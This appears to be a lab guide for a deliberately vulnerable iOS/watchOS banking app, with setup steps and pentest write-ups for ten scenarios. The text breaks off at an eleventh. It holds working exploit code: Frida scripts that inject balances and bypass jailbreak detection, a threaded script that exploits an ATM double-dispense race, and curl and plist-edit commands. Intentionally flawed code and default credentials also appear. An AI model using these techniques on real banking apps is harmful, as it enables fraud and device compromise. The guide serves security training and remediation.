# 🍏 Comprehensive Security Research Guide: Apple iOS & watchOS
## Nexora OmniWear — Apple Ecosystem Banking Security Assessment Lab
### Compliance Standards: OJK POJK 11/POJK.03/2022, Bank Indonesia SNAP QRIS, & PCI-DSS v4.0

---

## 📑 Table of Contents
1. [Architecture & Apple Binary Specifications](#1-architecture--apple-binary-specifications)
2. [Lab Setup Using Xcode Simulator (MacBook Intel / Apple Silicon)](#2-lab-setup-using-xcode-simulator-macbook-intel--apple-silicon)
3. [Lab Setup Using Physical Devices (Real iPhone 11 & Apple Watch)](#3-lab-setup-using-physical-devices-real-iphone-11--apple-watch)
4. [Authentic Dummy Banking Application User Flow](#4-authentic-dummy-banking-application-user-flow)
5. [Master Writeup: 11 Apple iOS & watchOS Pentest Scenarios](#5-master-writeup-11-apple-ios--watchos-pentest-scenarios)
   - [Scenario 1: Plaintext Dictionary WCSession Interception & Replay (V-AP02)](#scenario-1-plaintext-dictionary-wcsession-interception--replay-v-ap02)
   - [Scenario 2: UserDefaults Plist Insecure Storage & Keychain Bypass (V-AP01)](#scenario-2-userdefaults-plist-insecure-storage--keychain-bypass-v-ap01)
   - [Scenario 3: Unthrottled Quick-PIN 4-Digit Brute-Force & Memory Exfiltration (V-AP03)](#scenario-3-unthrottled-quick-pin-4-digit-brute-force--memory-exfiltration-v-ap03)
   - [Scenario 4: High-Value (Rp 50.000.000) Out-of-Band 2FA Wire Transfer Hijack (V-AP04)](#scenario-4-high-value-rp-50000000-out-of-band-2fa-wire-transfer-hijack-v-ap04)
   - [Scenario 5: Sensor Wrist-Off Lockout Spoofing & Heart Rate Leak (V-AP05)](#scenario-5-sensor-wrist-off-lockout-spoofing--heart-rate-leak-v-ap05)
   - [Scenario 6: Contactless Dynamic SNAP QRIS Static Replay (V-AP06)](#scenario-6-contactless-dynamic-snap-qris-static-replay-v-ap06)
   - [Scenario 7: Remote Balance Injection via Insecure WatchBridge (V-B01)](#scenario-7-remote-balance-injection-via-insecure-watchbridge-v-b01)
   - [Scenario 8: ATM Cardless Cash-Out OTP Brute-Force & Race Condition (V-L04)](#scenario-8-atm-cardless-cash-out-otp-brute-force--race-condition-v-l04)
   - [Scenario 9: Emergency Wrist Card Kill-Switch Desynchronization (V-W09)](#scenario-9-emergency-wrist-card-kill-switch-desynchronization-v-w09)
   - [Scenario 10: Client-Side iOS Jailbreak Anti-Tamper Detection Bypass (V-07)](#scenario-10-client-side-ios-jailbreak-anti-tamper-detection-bypass-v-07)
   - [Scenario 11: CISO Governance & Audit Compliance Assessment (POJK 11 / PCI-DSS v4.0)](#scenario-11-ciso-governance--audit-compliance-assessment-pojk-11--pci-dss-v40)
6. [Frida & Cycript Cheatsheet for iOS & watchOS](#6-frida--cycript-cheatsheet-for-ios--watchos)
7. [Regulatory Compliance Matrix & Enterprise Remediation](#7-regulatory-compliance-matrix--enterprise-remediation)

---

## 🏛️ 1. Architecture & Apple Binary Specifications

The Nexora Apple banking ecosystem features a hybrid architecture: **React Native (iOS Companion)** paired with **Native SwiftUI + WatchConnectivity (`WCSession`)** for Apple Watch:

```
┌─────────────────────────────────────────────────────────────┐
│                 Researcher Laptop / Host System             │
│            Local Air-Gapped Core Backend (Flask: 0.0.0.0:5000)│
└──────────────────────────────┬──────────────────────────────┘
                               │ HTTP REST (100% Offline LAN)
                               ▼
┌─────────────────────────────────────────────────────────────┐
│                 iPhone 11 (iOS 15.1 - 17.x)                 │
│  - React Native Companion (`nexora-ios-companion-release`)  │
│  - Native Bridge: `WatchBridge.swift` / `WatchBridge.m`     │
│  - Local DB & Token Cache (Keychain Bypass)                 │
└──────────────────────────────┬──────────────────────────────┘
                               │ Apple WCSession (Bluetooth LE)
                               ▼
┌─────────────────────────────────────────────────────────────┐
│             Apple Watch Series 9 / Ultra (watchOS 9.0+)     │
│  - Target Victim: Native SwiftUI Target (`NexoraWatch`)   │
│  - Insecure Storage: `UserDefaults.standard` Plist          │
│  - Quick-PIN Pad 3x4 & SNAP QRIS Display                    │
│  - Optical PPG Pulse Sensor & Wrist-Off Gatekeeper          │
│  - High-Value 2FA Approval Modal (Rp 50.000.000 Transfer)   │
│  - ATM Cardless Cash-Out & Emergency Wrist Card Kill-Switch  │
└─────────────────────────────────────────────────────────────┘
```

### Official Release Binaries
All binaries can be downloaded directly from the [**GitHub Releases Tab**](https://github.com/angganovryanputra/nexora-private-banking/releases/latest):

| File Name | Target Hardware | Format & Role |
|---|---|---|
| **`nexora-ios-companion-release.ipa`** | iPhone 11 / iOS 15.1+ | Production-built iOS installer for sideloading (AltStore / Sideloadly). |
| **`Nexora-watchOS-Bundle.zip`** | Apple Watch / Xcode | Native SwiftUI Watch App bundle (`NexoraWatch`) + bridging headers for direct compilation and debugging in Xcode. |
| **`SHA256SUMS.txt`** | All Artifacts | Cryptographic SHA-256 verification hashes for chain of custody preservation. |

---

## 💻 2. Lab Setup Using Xcode Simulator (MacBook Intel / Apple Silicon)

This guide is designed for researchers using **MacBook Pro 2019 (Intel Core i7/i9)** or **Apple Silicon (M1/M2/M3)** running macOS Ventura / Sonoma with Xcode 15+.

### Prerequisites:
- macOS 13.5+ (Ventura) or 14+ (Sonoma)
- Xcode 15.0 or later (free from Mac App Store)
- Node.js v18+ and CocoaPods (`sudo gem install cocoapods`)

---

### Step 1: Clone Repository & Install Dependencies
Open Terminal on your Mac:

```bash
# 1. Clone repository
git clone https://github.com/angganovryanputra/nexora-private-banking.git
cd nexora-private-banking

# 2. Install Node dependencies
npm install --legacy-peer-deps

# 3. Install CocoaPods dependencies
cd ios
pod install --repo-update
cd ..
```

---

### Step 2: Open Workspace in Xcode
> [!IMPORTANT]
> **Always open the `.xcworkspace` file**, NEVER the `.xcodeproj` file!
```bash
open ios/VulnerableBankApp.xcworkspace
```

---

### Step 3: Configure Paired Simulator (iPhone 11 + Apple Watch)
1. In Xcode menu bar, select **Window** → **Devices and Simulators** (`Cmd + Shift + 2`).
2. Navigate to the **Simulators** tab.
3. In the bottom-left panel, click **`+`** (Create New Simulator).
4. Configure iPhone Simulator:
   - **Device Name**: `iPhone 11 Lab` (or `iPhone 15 Pro`).
   - **Device Type**: `iPhone 11`.
   - **OS Version**: `iOS 17.2` (or installed version).
5. Pair with Apple Watch:
   - Check **Pair Apple Watch**.
   - **Watch Device Name**: `Apple Watch Series 9 Lab`.
   - **Watch OS Version**: `watchOS 10.2` (or `watchOS 9.x`).
6. Click **Create**. You now have a virtual paired Bluetooth environment!

---

### Step 4: Start Local Flask Backend
```bash
python3 backend/server.py
```
> Server runs on `http://127.0.0.1:5000` (or your Mac Wi-Fi LAN IP).

---

### Step 5: Launch iOS Companion & Apple Watch App
1. In Xcode's Scheme Selector:
   - Select **`VulnerableBankApp`** → Target: **`iPhone 11 Lab`**.
   - Press **Run** (`Cmd + R`).
   - Once loaded, sign in with:
     - **Username**: `admin`
     - **Password**: `admin123`
2. Launch Watch target:
   - Select the Watch target → Target: **`Apple Watch Series 9 Lab`**.
   - Press **Run** (`Cmd + R`).
   - The Apple Watch screen will launch the **Nexora Watch Interface** automatically!

---

## 📱 3. Lab Setup Using Physical Devices (Real iPhone 11 & Apple Watch)

### Method A: Sideloading via Sideloadly / AltStore (Free Apple ID)
1. Download **`nexora-ios-companion-release.ipa`** from [GitHub Releases](https://github.com/angganovryanputra/nexora-private-banking/releases/latest).
2. Download and launch [Sideloadly](https://sideloadly.io/) on your PC or Mac.
3. Connect your iPhone 11 via Lightning USB cable.
4. Drag-and-drop the `.ipa` file into Sideloadly.
5. Enter your free Apple ID and click **Start**.
6. On your iPhone 11: Go to **Settings** → **General** → **VPN & Device Management** → Trust your developer certificate.
7. Open Nexora Bank on iPhone. The paired Apple Watch will automatically synchronize the companion app!

### Method B: Direct Deployment via Xcode (Recommended for Researchers)
1. Connect iPhone 11 to Mac via USB.
2. On iPhone 11: Enable **Developer Mode** (**Settings** → **Privacy & Security** → **Developer Mode** → Restart).
3. Open `ios/VulnerableBankApp.xcworkspace` in Xcode.
4. Under **Signing & Capabilities**, select your Personal Apple ID team.
5. Click **Run** (`Cmd + R`) to compile and deploy directly to both iPhone and Apple Watch!

---

## 🧭 4. Authentic Dummy Banking Application User Flow

Nexora Watch replicates a premier private digital banking workflow:

```
┌────────────────────────────────────────────────────────┐
│               NEXORA APPLE WATCH USER FLOW             │
│                                                        │
│  [1. Lock Screen / Off-Wrist Gatekeeper]               │
│         │ (Wear watch on wrist)                        │
│         ▼                                              │
│  [2. Quick-PIN 4-Digit Dial] ───── (Input "1234")      │
│         │                                              │
│         ▼                                              │
│  [3. Platinum Private Dashboard]                       │
│       - Liquid Balance: Rp 888.888.000 (Alexander Vance)     │
│       - PPG Heart Rate: 74 BPM                         │
│       - Dual-Mode Network: HTTP URLSession + WCSession  │
│         │                                              │
│         ├─► [SNAP QRIS Pay] ──► Merchant QR Barcode    │
│         │                        NMID & 120s Timer     │
│         │                                              │
│         ├─► [Cardless ATM] ───► 6-Digit Cash-Out OTP   │
│         │                        Double-Dispense Race  │
│         │                                              │
│         ├─► [Card Freeze] ────► Emergency Kill-Switch  │
│         │                        Virtual Cards Locked  │
│         │                                              │
│         ├─► [Audit Lab] ──────► 21 Exploit Vectors     │
│         │                        5 Security Pillars    │
│         │                                              │
│         └─► [High-Value 2FA] ─► Rp 50.000.000 Wire     │
│                                  Haptic Dialog Modal   │
└────────────────────────────────────────────────────────┘
```

---

## 🎯 5. Master Writeup: 11 Apple iOS & watchOS Pentest Scenarios

---

### Scenario 1: Plaintext Dictionary WCSession Interception & Replay (V-AP02)
- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.8)
- **Vulnerability Standard**: CWE-319 (Cleartext Transmission of Sensitive Information)
- **Description**:
  Communication between iPhone Companion and Apple Watch uses Apple's native `WatchConnectivity` (`WCSession`). Transaction instructions, account balances, and authorization tokens are transmitted as plain Objective-C/Swift dictionaries without application-layer AES-GCM encryption. A runtime memory sniffer or proxy can intercept and tamper with packets.
- **Root Cause Code** ([`ios/NexoraWatch/WatchSessionManager.swift`](file:///ios/NexoraWatch/WatchSessionManager.swift#L45-L65)):
  ```swift
  // VULNERABLE: WCSession packet handled without application-layer encryption
  public func session(_ session: WCSession, didReceiveMessage message: [String : Any], replyHandler: @escaping ([String : Any]) -> Void) {
      if let newBalance = message["balance"] as? Double {
          InsecureStorage.shared.saveBalance(newBalance)
      }
      if let action = message["action"] as? String, action == "TRIGGER_2FA" {
          self.pending2FATransaction = message
      }
  }
  ```
- **Exploitation & PoC**:
  Inject an arbitrary balance (`Rp 13.370.000.000` / `13370000.0`) directly into Apple Watch memory via Frida:
  ```javascript
  var WCSession = ObjC.classes.WCSession;
  var session = WCSession.defaultSession();
  var dict = ObjC.classes.NSMutableDictionary.alloc().init();
  dict.setObject_forKey_(ObjC.classes.NSNumber.numberWithDouble_(13370000.0), "balance");
  session.sendMessage_replyHandler_errorHandler_(dict, NULL, NULL);
  ```

---

### Scenario 2: UserDefaults Plist Insecure Storage & Keychain Bypass (V-AP01)
- **Severity**: **HIGH** (`CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:N/SA:N` — Score: 7.8)
- **Vulnerability Standard**: CWE-312 (Cleartext Storage of Sensitive Information), CWE-922 (Insecure Storage)
- **Description**:
  Sensitive banking tokens, customer account numbers, and Quick-PINs are stored in unencrypted `UserDefaults.standard` plists in the watch sandboxed container, bypassing **Apple Keychain Services (`kSecClassGenericPassword`)** and Secure Enclave.
- **Root Cause Code** ([`ios/NexoraWatch/InsecureStorage.swift`](file:///ios/NexoraWatch/InsecureStorage.swift#L29-L43)):
  ```swift
  // VULNERABLE: Plaintext write to UserDefaults plist
  public func saveAuthToken(_ token: String) {
      defaults.set(token, forKey: "nexora_auth_token")
      defaults.synchronize()
  }
  ```
- **PoC Command via Xcode Simulator**:
  ```bash
  xcrun simctl get_app_container booted org.reactjs.native.example.VulnerableBankApp.watchkitapp data
  plutil -p /Library/Preferences/org.reactjs.native.example.VulnerableBankApp.watchkitapp.plist
  ```

---

### Scenario 3: Unthrottled Quick-PIN 4-Digit Brute-Force & Memory Exfiltration (V-AP03)
- **Severity**: **HIGH** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` — Score: 7.5)
- **Vulnerability Standard**: CWE-307 (Excessive Authentication Attempts)
- **Description**:
  The 4-digit Quick-PIN has only 10,000 combinations. The watch app lacks exponential delay, hardware backoff, or remote wipe after failed attempts.
- **Root Cause Code** ([`ios/NexoraWatch/QuickPinPadView.swift`](file:///ios/NexoraWatch/QuickPinPadView.swift#L80-L95)):
  ```swift
  if enteredPin == correctPin {
      isAuthenticated = true
  } else {
      attemptCount += 1
      errorMessage = "Invalid PIN (\(attemptCount))"
      enteredPin = "" // Resets buffer without delay
  }
  ```

---

### Scenario 4: High-Value (Rp 50.000.000) Out-of-Band 2FA Wire Transfer Hijack (V-AP04)
- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.7)
- **Vulnerability Standard**: CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification)
- **Description**:
  Approving an Rp 50.000.000 international wire transfer to Evelyn Sterling (NX-7391048) on Apple Watch sends a bare dictionary `{"action": "APPROVE_2FA", "tx_id": ...}` without Secure Enclave biometric validation (`LocalAuthentication.LAContext`).
- **Root Cause Code** ([`ios/NexoraWatch/TwoFactorApprovalView.swift`](file:///ios/NexoraWatch/TwoFactorApprovalView.swift#L50-L68)):
  ```swift
  Button(action: {
      sessionManager.approvePendingTransaction()
  }) {
      Text("APPROVE") // Lacks LAContext biometric challenge or hardware-backed signing
  }
  ```

---

### Scenario 5: Sensor Wrist-Off Lockout Spoofing & Heart Rate Leak (V-AP05)
- **Severity**: **MEDIUM** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N` — Score: 5.3)
- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure), CWE-200 (Information Exposure)
- **Description**:
  The off-wrist lockout check relies on an in-memory boolean flag `isWristAttached` that can be swizzled at runtime, keeping the stolen watch unlocked.

---

### Scenario 6: Contactless Dynamic SNAP QRIS Static Replay (V-AP06)
- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.7)
- **Vulnerability Standard**: CWE-294 (Authentication Bypass by Capture-replay)
- **Description**:
  The watch generates an EMVCo dynamic QRIS string containing a static transaction token `A016304E8A2`. The backend executes payment without checking timestamp freshness or cryptographic nonce.

---

### Scenario 7: Remote Balance Injection via Insecure WatchBridge (V-B01)
- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.1)
- **Vulnerability Standard**: CWE-345 (Insufficient Verification of Data Authenticity)
- **Description**:
  React Native Native Bridge (`WatchBridge.m` and `WatchBridge.swift`) exposes methods `sendMessageToWatch` and `updateWatchContext` without session token validation. Rogue JavaScript can force fake balances to the watch display.

---

### Scenario 8: ATM Cardless Cash-Out OTP Brute-Force & Race Condition (V-L04)
- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` — Score: 8.2)
- **Vulnerability Standard**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization / Race Condition), OWASP MASVS-AUTH-1, OWASP API4:2023.
- **Description**:
  The Nexora OmniWear watch application provides an emergency cardless ATM cash-out feature. Initiating cash withdrawal generates a 6-digit numeric token (`cardless_cash_tokens`) valid for 5 to 15 minutes.
  Two fatal implementation flaws exist:
  1. **Unthrottled OTP Brute-Force**: The verification endpoint `/api/atm/cardless-cash/verify` has no rate-limiting, CAPTCHA, or anti-automation controls. An attacker can iterate through the 1,000,000 possible 6-digit combinations to claim active cash withdrawal reservations.
  2. **Double-Dispense Race Condition (TOCTOU)**: The verification handler executes a non-atomic read-then-write sequence (`SELECT ... WHERE status = 'ACTIVE'` followed by `time.sleep(0.06)` before `UPDATE ... SET status = 'DISPENSED'`). Concurrent requests utilizing identical tokens allow attackers to trigger duplicate cash disbursements from physical ATMs while only generating a single debit or even driving account balances negative.
- **Root Cause Code**:
  - Backend ([`backend/server.py`](file:///backend/server.py#L1350-L1378)):
    ```python
    @app.route('/api/atm/cardless-cash/verify', methods=['POST'])
    def verify_cardless_cash():
        # ...
        cur.execute('''
            SELECT * FROM cardless_cash_tokens 
            WHERE token = ? AND status = 'ACTIVE' AND expires_at > datetime('now')
        ''', (token,))
        record = cur.fetchone()

        if not record:
            return jsonify({"message": "Invalid or expired ATM cash token"}), 400

        # V-L04: Intentional Race Condition window (CWE-362 / TOCTOU)
        # Non-atomic verification without row-level lock allows concurrent requests to double dispense
        time.sleep(0.06)

        cur.execute("UPDATE users SET balance = balance - ? WHERE account_number = ?", (record['amount'], record['account_number']))
        cur.execute("UPDATE cardless_cash_tokens SET status = 'DISPENSED' WHERE id = ?", (record['id'],))
        conn.commit()
    ```
  - watchOS Client ([`ios/NexoraWatch/CardlessCashView.swift`](file:///ios/NexoraWatch/CardlessCashView.swift#L10-L15) and [`ios/NexoraWatch/WatchNetworkManager.swift`](file:///ios/NexoraWatch/WatchNetworkManager.swift#L161-L185)):
    The watch app requests dynamic OTP tokens and exposes the code on screen without device binding or two-channel confirmation.
- **Exploitation & Reproduction**:
  1. **Step 1 — Verify Single ATM Withdrawal Request via curl**:
     ```bash
     curl -X POST http://127.0.0.1:5000/api/atm/cardless-cash/verify \
       -H "Content-Type: application/json" \
       -d '{"token":"463544","account_number":"NX-8492014"}'
     ```
  2. **Step 2 — Execute Concurrent Double-Dispense Exploit (`exploit_double_dispense.py`)**:
     ```python
     #!/usr/bin/env python3
     # exploit_double_dispense.py — Nexora ATM Cardless Race Condition PoC
     import concurrent.futures
     import json
     import urllib.request

     API_ENDPOINT = "http://127.0.0.1:5000/api/atm/cardless-cash/verify"
     PAYLOAD = json.dumps({"token": "463544", "account_number": "NX-8492014"}).encode("utf-8")

     def trigger_dispense(thread_id):
         req = urllib.request.Request(
             API_ENDPOINT,
             data=PAYLOAD,
             headers={"Content-Type": "application/json"}
         )
         try:
             with urllib.request.urlopen(req, timeout=5) as res:
                 return thread_id, res.status, res.read().decode("utf-8")
         except urllib.error.HTTPError as err:
             return thread_id, err.code, err.read().decode("utf-8")

     print("[*] Dispatching 8 simultaneous ATM dispense requests within race window...")
     with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
         futures = [pool.submit(trigger_dispense, idx) for idx in range(1, 9)]
         for completed in concurrent.futures.as_completed(futures):
             tid, status, body = completed.result()
             print(f"  [Thread #{tid}] HTTP {status} -> {body}")
     ```
  3. **Expected Output & Database Evidence**:
     - Multiple threads return `HTTP 200` with `"status": "DISPENSED"`.
     - Inspecting `backend/nexora_vault.db`:
       ```bash
       sqlite3 backend/nexora_vault.db "SELECT id, from_account, to_account, amount, description, timestamp FROM transactions WHERE description LIKE '%Cardless Cash%' ORDER BY id DESC LIMIT 4;"
       ```
       Reveals duplicate ledger deductions (e.g., two distinct Rp 100.000 debits executed simultaneously against a single OTP generation event).
- **Regulatory Impact**:
  - **POJK 11/POJK.03/2022 Pasal 25 & 31**: Inadequate technical safeguards for electronic funds transfer; violation of transactional integrity standards.
  - **PCI-DSS v4.0 Requirement 6.2 & 6.5**: Failure to address race conditions and state management vulnerabilities in high-risk payment interfaces.
- **Enterprise Remediation**:
  1. **Distributed Concurrency Lock**: Enforce distributed mutex locks (e.g. Redis `SET lock:otp:<token> <uuid> NX PX 5000` or database row-level locking).
  2. **Single-Operation Atomic Transition**: Invalidate the token in the same atomic SQL statement:
     ```sql
     UPDATE cardless_cash_tokens SET status = 'DISPENSED' 
     WHERE token = ? AND status = 'ACTIVE' AND expires_at > datetime('now');
     ```
     Only proceed with cash disbursement if `rows_affected == 1`.
  3. **Exponential Brute-Force Throttling**: Restrict `/api/atm/cardless-cash/verify` to a maximum of 3 failed attempts per token/account, followed by temporary 15-minute freeze and security operations alert.

---

### Scenario 9: Emergency Wrist Card Kill-Switch Desynchronization (V-W09)
- **Severity**: **MEDIUM** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N` — Score: 6.9)
- **Vulnerability Standard**: CWE-306 (Missing Authentication for Critical Function), CWE-345 (Insufficient Verification of Data Authenticity), CWE-390 (Detection of Error Condition Without Action), OWASP MASVS-RESILIENCE-1.
- **Description**:
  The watchOS application includes an emergency virtual card freeze switch (`CardFreezeView.swift`) allowing users to lock compromised cards immediately from their wrist. However, the client updates its internal UI state optimistically before confirming that the core banking backend has successfully transitioned the card status.
  If an adversary drops the `/api/wearable/card-freeze` packet via network proxy, or if cellular/Bluetooth connectivity drops, the watch displays an emerald lock with "FROZEN", creating a false sense of security while the physical card and core database remain `ACTIVE` (`is_frozen = 0`), leaving the account vulnerable to unauthorized merchant transactions.
- **Root Cause Code**:
  - Watch Client ([`ios/NexoraWatch/CardFreezeView.swift`](file:///ios/NexoraWatch/CardFreezeView.swift#L105-L135) and [`ios/NexoraWatch/WatchNetworkManager.swift`](file:///ios/NexoraWatch/WatchNetworkManager.swift#L195-L225)):
    ```swift
    // VULNERABLE: Optimistic local state modification without validated server receipt
    WatchNetworkManager.shared.toggleCardFreeze(cardId: cardId, isFrozen: targetState) { result in
        DispatchQueue.main.async {
            self.isProcessing = false
            switch result {
            case .success:
                InsecureStorage.shared.setCardFrozen(targetState)
            case .failure:
                // Silent fallback leaves local UI out-of-sync with core banking ledger
                statusMessage = "Offline - marked frozen locally"
            }
        }
    }
    ```
  - Backend Controller ([`backend/server.py`](file:///backend/server.py#L1450-L1483)):
    ```python
    @app.route('/api/wearable/card-freeze', methods=['POST'])
    def wearable_card_freeze():
        data = request.get_json(silent=True) or {}
        card_id = data.get('card_id', 1)
        raw_frozen = data.get('is_frozen') if 'is_frozen' in data else data.get('frozen')
        is_frozen = 0 if raw_frozen in (0, '0', False, 'false') else 1
        # Lacks cryptographic cardholder signature or mutual HMAC verification
        cur.execute("UPDATE virtual_cards SET is_frozen = ? WHERE id = ?", (is_frozen, card_id))
    ```
- **Exploitation & Reproduction**:
  1. **Step 1 — Intercept & Drop Request via Burp Suite Proxy**:
     - Configure Burp Suite listener on port 8080 and route iOS/watchOS HTTP traffic through the proxy.
     - Add an intercept rule for `/api/wearable/card-freeze` and choose **Drop Action**.
     - On Apple Watch `CardFreezeView`, tap the freeze card button.
     - Observe Apple Watch UI transitions to "FROZEN" state.
  2. **Step 2 — Verify Backend Active Status via curl**:
     Query the backend directly to inspect live virtual card state:
     ```bash
     curl -s http://127.0.0.1:5000/check_balance/NX-8492014
     ```
     Execute an unauthorized merchant charge against the supposedly frozen card:
     ```bash
     curl -X POST http://127.0.0.1:5000/api/qris/checkout \
       -H "Content-Type: application/json" \
       -d '{"account_number":"NX-8492014","merchant_id":"CYBER-STORE-01","amount":75000,"currency":"IDR"}'
     ```
  3. **Expected Output & Database Evidence**:
     - The checkout returns HTTP 200 `PAYMENT_SUCCESS` and deducts user balance.
     - SQLite database check:
       ```bash
       sqlite3 backend/nexora_vault.db "SELECT id, card_number, card_holder, is_frozen FROM virtual_cards;"
       ```
       The card record displays `is_frozen = 0`, demonstrating total desynchronization between wrist UI and backend security controls.
- **Regulatory Impact**:
  - **POJK 11/POJK.03/2022 Pasal 25**: Failure to provide reliable, synchronized transaction management and customer fraud mitigation mechanisms.
  - **PCI-DSS v4.0 Requirement 4.1 & 8.3**: Critical card security controls must maintain cryptographic verification and confirmed delivery to card processing hosts.
- **Enterprise Remediation**:
  1. **Two-Phase Commit with Cryptographic Confirmation Nonce**:
     The watch UI must remain in a "PENDING CONFIRMATION" state until the core banking system returns a cryptographically signed acknowledgement token containing a server timestamp and card status signature.
  2. **Mandatory Failure Warning & Emergency Contact Modal**:
     If network timeout occurs, immediately revert the local UI state and present an explicit warning dialog: `"Freeze Request Unconfirmed. Card may remain active. Tap to Call Bank Hotline 1500888 immediately."`
  3. **Mutual Request Signing**:
     Protect freeze toggle requests with device-bound HMAC signatures generated by keys stored in the Apple Watch Secure Enclave.

---

### Scenario 10: Client-Side iOS Jailbreak Anti-Tamper Detection Bypass (V-07)
- **Severity**: **MEDIUM** (`CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N` — Score: 5.8)
- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure), CWE-312 (Cleartext Storage of Sensitive Information), OWASP MASVS-RESILIENCE-1.
- **Description**:
  The Nexora banking companion implements an anti-tamper security module (`SecurityCheckModule.swift`) designed to halt execution if a jailbroken environment, Cydia substrate, or Frida instrumentation is identified.
  However, this defense mechanism is purely client-side "security theater":
  1. **Static Heuristic Filesystem Checks**: Evaluates standard hardcoded filesystem paths (`/Applications/Cydia.app`, `/Library/MobileSubstrate/MobileSubstrate.dylib`, `/usr/sbin/sshd`, `/etc/apt`) and sandbox write probes.
  2. **Insecure Plist Bypass Switch**: The audit function directly evaluates `InsecureStorage.shared.isJailbreakBypassActive()`, reading the unencrypted `UserDefaults` key `nexora_bypass_jailbreak_check`. Attackers can permanently disable all jailbreak detection by altering this plist setting.
  3. **Trivial Userland Hooking**: Attackers using Frida can hook `NSFileManager.defaultManager.fileExistsAtPath:` to return `false` for any monitored path in fewer than 10 lines of JavaScript.
- **Root Cause Code**:
  - [`ios/NexoraWatch/SecurityCheckModule.swift`](file:///ios/NexoraWatch/SecurityCheckModule.swift#L28-L55):
    ```swift
    public func runIntegrityAudit() {
        if InsecureStorage.shared.isJailbreakBypassActive() {
            // [V-R02 Bypass]: Security check defeated by client-side override
            isJailbroken = false
            fridaDetected = false
            detectionSummary = "Bypassed via Client Flag ✓"
            return
        }
        
        var findings: [String] = []
        // Filesystem path check vulnerable to Frida hooking
        for path in jailbreakFilePaths {
            if FileManager.default.fileExists(atPath: path) {
                findings.append("Found: \(path)")
            }
        }
    ```
- **Exploitation & Reproduction**:
  1. **Method A — Modifying UserDefaults Plist via Terminal / Simulator**:
     ```bash
     # Read current bypass status
     defaults read org.reactjs.native.example.VulnerableBankApp.watchkitapp nexora_bypass_jailbreak_check
     
     # Force bypass flag to TRUE
     defaults write org.reactjs.native.example.VulnerableBankApp.watchkitapp nexora_bypass_jailbreak_check -bool true
     ```
  2. **Method B — Dynamic Runtime Hooking (`bypass_jailbreak.js`)**:
     ```javascript
     /* bypass_jailbreak.js — Runtime Jailbreak Detection Hook */
     if (ObjC.available) {
         console.log("[*] Intercepting NSFileManager fileExistsAtPath...");
         var NSFileManager = ObjC.classes.NSFileManager;
         var hook = NSFileManager["- fileExistsAtPath:"];

         Interceptor.attach(hook.implementation, {
             onEnter: function (args) {
                 var path = ObjC.Object(args[2]).toString();
                 this.isJailbreakPath = false;
                 var signatures = ["Cydia", "MobileSubstrate", "sshd", "apt", "bash", "bin"];
                 for (var i = 0; i < signatures.length; i++) {
                     if (path.indexOf(signatures[i]) !== -1) {
                         this.isJailbreakPath = true;
                         console.log("  [+] Spoofing non-existence of jailbreak artifact: " + path);
                         break;
                     }
                 }
             },
             onLeave: function (retval) {
                 if (this.isJailbreakPath) {
                     retval.replace(ptr(0)); // Return NO (path does not exist)
                 }
             }
         });

         // Invalidate in-memory bypass flag
         var InsecureStorage = ObjC.classes.InsecureStorage;
         if (InsecureStorage) {
             var storage = InsecureStorage.shared();
             storage.setJailbreakBypass_(1);
             console.log("[+] InsecureStorage.setJailbreakBypass(true) executed.");
         }
     }
     ```
     Execute hook:
     ```bash
     frida -U -n "VulnerableBankApp" -l bypass_jailbreak.js
     ```
  3. **Expected Output**:
     - Terminal console logs all intercepted paths returning `NO`.
     - The application integrity status switches to: `"Integrity Clean (Bypassed via Client Flag ✓)"`, granting full access on compromised devices.
- **Regulatory Impact**:
  - **POJK 11/POJK.03/2022 Pasal 25**: Mandates banks to ensure client-side security integrity controls are robust against local bypass.
  - **PCI-DSS v4.0 Requirement 10.5 & 11.5**: Anti-tampering controls and file integrity monitoring must not be defeatable via client-side configuration changes.
- **Enterprise Remediation**:
  1. **Hardware-Backed Remote Attestation (Apple App Attest)**:
     Replace heuristic filesystem checks with Apple's **DeviceCheck** and **DCAppAttestService**. App Attest generates hardware-backed keys inside the Secure Enclave, which are validated cryptographically against Apple's attestation servers.
  2. **Server-Side Challenge-Response Architecture**:
     Enforce a server-side nonce verification model: the backend supplies a cryptographic challenge on login, which must be signed by the Secure Enclave attestation key. Nonce replay or missing attestation blocks all API transactions.

---

### Scenario 11: CISO Governance & Regulatory Compliance Assessment (POJK 11 / PCI-DSS v4.0)
- **Severity**: **HIGH** (Severe Regulatory Violation & Operating Risk)
- **Audit Frameworks Evaluated**:
  - **OJK POJK 11/POJK.03/2022**: Penyelenggaraan Teknologi Informasi oleh Bank Umum.
  - **Bank Indonesia PADG 24/1/PADG/2022**: Standar Nasional Open API Pembayaran (SNAP) & QRIS Dinamis.
  - **PCI-DSS v4.0**: Payment Card Industry Data Security Standard.
- **Description & Executive Audit Summary**:
